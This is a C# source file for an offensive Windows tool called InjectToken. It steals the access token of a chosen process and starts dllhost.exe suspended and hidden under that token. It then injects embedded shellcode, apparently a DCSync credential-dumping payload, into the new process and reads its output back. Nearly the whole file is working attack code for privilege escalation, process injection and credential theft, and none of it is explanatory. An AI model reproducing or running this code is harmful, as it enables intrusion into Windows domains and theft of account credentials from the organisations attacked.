using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WinAPI;
using WinAPI.Wrapper;

namespace InjectToken
{
    internal class Program
    {
        public static string GetRunningExeName()
        {
            string processName = Process.GetCurrentProcess().MainModule.FileName;
            string exeName = System.IO.Path.GetFileName(processName);
            return exeName;
        }

        static void Main(string[] args)
        {
            APIWrapper.Config.PreferedAccessType = WinAPI.Wrapper.APIAccessType.DInvoke;

            string cmd = @"c:\windows\system32\dllhost.exe";
            //byte[] shellcode = Properties.Resources.Payload;
            byte[] shellcode = Properties.Resources.dcsyn;
            int? processId = null;
            ProcessCreationResult procResult = null;

            try
            {
                if (args.Length != 1)
                {
                    Console.WriteLine($"Usage: {GetRunningExeName()} processId");
                    return;
                }
                else
                {
                    if (!int.TryParse(args[0], out var pId))
                        throw new ArgumentException("Process is not valid!");
                    processId = pId;
                }


                Console.WriteLine($"[?] WinAPIAccess = {APIWrapper.Config.PreferedAccessType}");
                Console.WriteLine($"[?] InjectionMethod = {APIWrapper.Config.PreferedInjectionMethod}");

                Console.WriteLine($"[>] Stealing Token from process {processId}...");
                IntPtr hToken = APIWrapper.StealToken(processId.Value);
                Console.WriteLine($"[?] TokenHandle = {hToken}");

                var creationParms = new ProcessCreationParameters()
                {
                    Command = cmd,
                    Token = hToken,
                    RedirectOutput = true,
                    CreateNoWindow = true,
                    CreateSuspended = true,
                };

                procResult = APIWrapper.CreateProcess(creationParms);

                Console.WriteLine($"[?] ProcessId = {procResult.ProcessId}");
                Console.WriteLine($"[?] ProcessHandle = {procResult.ProcessHandle}");
                Console.WriteLine($"[?] PipeHandle = {procResult.OutPipeHandle}");

                APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode);

                if (procResult.ProcessId != 0 && creationParms.RedirectOutput)
                {
                    Console.WriteLine("[+] Result :");
                    APIWrapper.ReadPipeToEnd(procResult.ProcessId, procResult.OutPipeHandle, output => Console.Write(output));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Oooops something went wrong....");
                Console.WriteLine(ex.ToString());
            }
            finally
            {
                if (procResult != null)
                {
                    APIWrapper.CloseHandle(procResult.ProcessHandle);
                    APIWrapper.CloseHandle(procResult.ThreadHandle);
                    APIWrapper.CloseHandle(procResult.OutPipeHandle);
                    APIWrapper.KillProcess(procResult.ProcessId);
                }
            }
        }
    }
}
